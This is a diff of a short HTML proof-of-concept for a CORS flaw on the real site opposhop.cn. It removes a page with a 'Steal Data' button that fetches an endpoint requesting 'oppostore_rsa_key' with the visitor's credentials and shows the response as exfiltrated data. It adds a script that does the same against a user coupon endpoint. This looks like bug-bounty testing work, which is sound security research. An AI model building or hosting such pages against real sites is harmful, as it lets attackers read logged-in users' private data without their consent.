@@ -1,24 +1,8 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Oppo CORS PoC</title>
-</head>
-<body>
-  <h2>Testing Oppo CORS Leak</h2>
-  <button onclick="exploit()">Steal Data</button>
-
-  <script>
-    function exploit() {
-      fetch("https://www.opposhop.cn/cn/oapi/configs/web/switches/list?codes=oppostore_rsa_key", {
-        credentials: "include"
-      })
-      .then(resp => resp.text())
-      .then(data => {
-        console.log("Exfiltrated Response:", data);
-        alert("Data: " + data);
-      })
-      .catch(err => console.error(err));
-    }
-  </script>
-</body>
-</html>
+<script>
+fetch("https://www.opposhop.cn/cn/oapi/users/web/couponsCenter/getPurposeCoupons?code=good_coupons&scene=couponCenter", {
+  credentials: "include",
+  method: "GET"
+})
+.then(r => r.text())
+.then(d => document.body.innerText = d);
+</script>
